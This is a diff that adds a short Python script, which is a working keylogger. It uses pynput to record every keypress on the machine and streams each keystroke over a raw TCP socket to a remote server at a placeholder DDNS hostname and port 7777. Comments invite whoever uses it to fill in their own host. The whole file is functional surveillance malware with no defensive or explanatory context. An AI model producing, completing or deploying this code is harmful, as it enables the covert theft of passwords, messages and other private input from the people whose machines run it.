@@ -1,0 +1,48 @@
+from pynput.keyboard import Listener
+import socket
+
+# Dictionary to map keys to their replacements
+key_replacements = {
+    "Key.space": " ",
+    "Key.enter": "\n",
+    "Key.backspace": "",
+    "Key.caps_lock": "",
+    "Key.shift": "",
+    "Key.shift_r": "",
+    "Key.shift_l": "",
+    "Key.alt_gr": "",
+    "Key.ctrl_l": "",
+    "Key.ctrl_r": "",
+    "Key.esc": "",
+    "Key.cmd": "",
+    "Key.down": "",
+    "Key.right": "",
+    "Key.up": "",
+    "Key.left": "",
+    "Key.alt_l": "",
+    "Key.alt_r": "",
+    "Key.tab": ""
+}
+
+def send_key(key):
+    k = str(key).replace("'", "")
+    
+    # Replace key if it is in the dictionary, otherwise keep the original key representation
+    k = key_replacements.get(k, k)
+    
+    try:
+        # Send the keystroke to the server
+        sock.sendall(k.encode('utf-8'))
+    except Exception as e:
+        print(f"Error sending key: {e}")
+
+# Connect to the server
+server_hostname = '$$$$$.ddns.net'  # Replace with your DDNS hostname
+server_port = 7777  # Replace with your server's port
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((server_hostname, server_port))
+
+with Listener(on_press=send_key) as listener:
+    listener.join()
+
+sock.close()
